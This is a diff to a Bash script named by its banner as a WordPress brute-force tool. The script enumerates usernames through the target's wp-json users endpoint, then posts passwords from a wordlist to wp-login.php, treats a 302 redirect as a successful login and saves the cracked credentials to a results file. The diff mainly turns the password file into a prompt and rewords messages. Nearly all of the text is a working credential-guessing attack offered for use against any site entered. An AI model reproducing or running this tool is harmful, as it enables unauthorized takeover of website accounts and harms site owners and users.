@@ -2,7 +2,6 @@
 
 curl_timeout=20
 multithread_limit=10
-password_list="pass.txt"
 
 if [[ -f wpusername.tmp ]]
 then
@@ -22,12 +21,12 @@ function _GetUserWPJSON() {
         Target="${1}";
         UsernameLists=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-json/wp/v2/users" | grep -Po '"slug":"\K.*?(?=")');
         echo ""
-        if [[ -z ${UsernameLists} ]]
+        if [[ -z ${UsernameLists} ]];
         then
-                echo -e "${CYN}INFO: No usernames detected, proceeding without username enumeration.${CLR}"
+                echo -e "${CYN}INFO: Cannot detect Username!${CLR}"
         else
                 echo -ne > wpusername.tmp
-                for Username in ${UsernameLists}
+                for Username in ${UsernameLists};
                 do
                         echo "INFO: Found username \"${Username}\"..."
                         echo "${Username}" >> wpusername.tmp
@@ -40,10 +39,10 @@ function _TestLogin() {
         Username="${2}"
         Password="${3}"
         LetsTry=$(curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s -w "\nHTTP_STATUS_CODE_X %{http_code}\n" "${Target}/wp-login.php" --data "log=${Username}&pwd=${Password}&wp-submit=Log+In" --compressed)
-        if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]]
+        if [[ ! -z $(echo ${LetsTry} | grep login_error | grep div) ]];
         then
                 : # Jangan tampilkan list password yang salah
-        elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]]
+        elif [[ $(echo ${LetsTry} | grep "HTTP_STATUS_CODE_X" | awk '{print $2}') == "302" ]];
         then
                 echo -e "${GRN}[!] FOUND ${Target} \e[30;48;5;82m ${Username}:${Password} ${CLR}"
                 echo "${Target} [${Username}:${Password}]" >> wpbf-results.txt
@@ -52,6 +51,7 @@ function _TestLogin() {
 
 # Print Banner
 echo -e "\x1b[1;96m
+
                    __        ______                            
                   \ \      / /  _ \                           
                    \ \ /\ / /| |_) |                          
@@ -61,18 +61,27 @@ echo -e "\x1b[1;96m
  |  _ \| |_) | | | | | | |  _| | |_ | | | | |_) | |   |  _|   
  | |_) |  _ <| |_| | | | | |___|  _|| |_| |  _ <| |___| |___  
  |____/|_| \_\\___/  |_| |_____|_|   \___/|_| \_\\____|_____| 
-                                             
+
+
+
+  https://target.com/wp-login.php
+ ? = admin
+ ? = pass.txt
+ 
 "
 
 echo -ne "[?] Input website target : \x1b[1;97m"
 read Target
 
 curl --connect-timeout ${curl_timeout} --max-time ${curl_timeout} -s "${Target}/wp-login.php" > wplogin.tmp
-if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]]
+if [[ -z $(cat wplogin.tmp | grep "wp-submit") ]];
 then
         echo -e "${RED}ERROR: Invalid wordpress wp-login!${CLR}"
         exit
 fi
+
+echo -ne "[?] Input password lists in (file) : \x1b[1;97m"
+read password_list
 
 if [[ ! -f ${password_list} ]]
 then
@@ -82,7 +91,7 @@ fi
 
 _GetUserWPJSON ${Target}
 
-if [[ -f wpusername.tmp && -s wpusername.tmp ]]
+if [[ -f wpusername.tmp ]]
 then
         for User in $(cat wpusername.tmp)
         do
@@ -96,6 +105,7 @@ then
                 )
         done
 else
+        echo -e "${RED}INFO: Cannot find username${CLR}"
         echo -ne "[?] Input username manually : \x1b[1;97m"
         read User
 
